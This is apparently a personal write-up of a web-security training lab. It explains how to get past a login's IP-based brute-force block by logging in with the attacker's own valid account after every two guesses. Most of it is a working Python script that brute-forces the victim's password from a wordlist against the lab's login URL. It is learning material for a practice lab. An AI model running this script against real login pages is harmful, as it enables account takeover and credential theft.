# Lab: Broken brute-force protection, IP block

Topic : **Broken brute-force protection, IP block**

Auth : Bypassing brute force protection ( self login at intervals to bypass brute force)

End Goal : Logging in the account

Analysis : 

1. Given → 
    - Your credentials: `wiener:peter`
    - Victim's username: `carlos`
2. I examined the request from Burp Suite. It gives a block for 1 minute after trying for around 3 tries (did not find the exact number of tries) . It resets when i log in with correct credentials.
3. So, my main task now, is to create a script which will  brute force the passwords for our **user** but after every 2 tries, we will log in with correct credentials to reset the block.
4. Script :
    
    ```python
    #!/usr/bin/env python3
    
    import requests
    import sys
    
    # extract list
    def createList(filename):
        with open(filename, "r") as f:
            return [line.strip() for line in f]
    
    def passwordBruteforce(URL, passwords):
    
        counter = 0
        i = 1 # feedback
        j = 0
    
        while j < len(passwords):
    
            print(i)
            i += 1
    
            if counter == 2:
                data = {
                    "username":"wiener",
                    "password":"peter"
                }
                counter = -1 # resetting the counter (not 0 because it increments in this case too)
                j -= 1 # so that the current password is checked too
            else:
                data = {
                    "username":"carlos",
                    "password": passwords[j]
                }
    
            counter += 1
    
            proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} # to run the requests through Burp Suite (better supervision)
    
            r = requests.post(URL, data=data, proxies=proxies, verify=False)
            print("-" * 50)
            print("data: ", data)
            print("-" * 50)
    
            if ("Incorrect password" not in r.text) and data.get("username") == "carlos":
                print(f"Found Credentials: User: carlos, Password: {passwords[j]}")
                return
    
            j += 1
    
    def main():
    
        if len(sys.argv) < 2 :
            print("1 arguments REQUIRED -> <password_file>")
            sys.exit(0)
    
        pass_file = sys.argv[1]
    
        URL = "https://0a7f000503293dcc80c41cdf009400b0.web-security-academy.net/login"
    
        passwords = createList(pass_file)
    
        # Victim username -> carlos
        passwordBruteforce(URL, passwords)
        
    
    if __name__ == "__main__":
        main()
    
    ```
    
5. Script Summary
    
    This script runs as an executable and takes one argument which is the password list to be brute forced. This send **POST** request to the url and gives correct credentials every 3rd time to bypass the brute force.
    
6. This script gives the found credentials and you solve the lab